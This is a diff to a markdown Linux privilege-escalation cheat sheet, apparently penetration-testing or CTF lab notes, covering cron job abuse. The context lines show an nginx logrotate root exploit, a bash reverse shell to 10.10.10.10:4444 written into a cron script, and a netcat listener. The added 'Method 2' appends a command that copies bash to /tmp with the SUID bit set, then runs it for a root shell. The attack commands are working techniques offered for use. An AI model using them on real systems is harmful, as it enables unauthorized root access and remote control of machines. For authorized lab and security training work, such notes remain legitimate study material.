@@ -400,7 +400,7 @@ dpkg -l | grep nginx
 /tmp/nginxed-root.sh /var/log/nginx/error.log
 ````
 - System will wait for logrotate to execute, become root user
-### Cron Jobs -File permissions
+### Cron Jobs File permissions
 - Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. 
 - Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab`.
 - View the contents of the system-wide crontab:
@@ -424,6 +424,15 @@ bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 - Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run. A root shell should connect back to your netcat listener.
 ````
 nc -nvlp 4444
+````
+#### Cron Jobs File permissions Method 2
+````
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
+````
+- Wait the defined period of time
+````
+/tmp/bash -p
+id
 ````
 ### Cron Jobs Path Environment Variable
 - View the contents of the system-wide crontab:
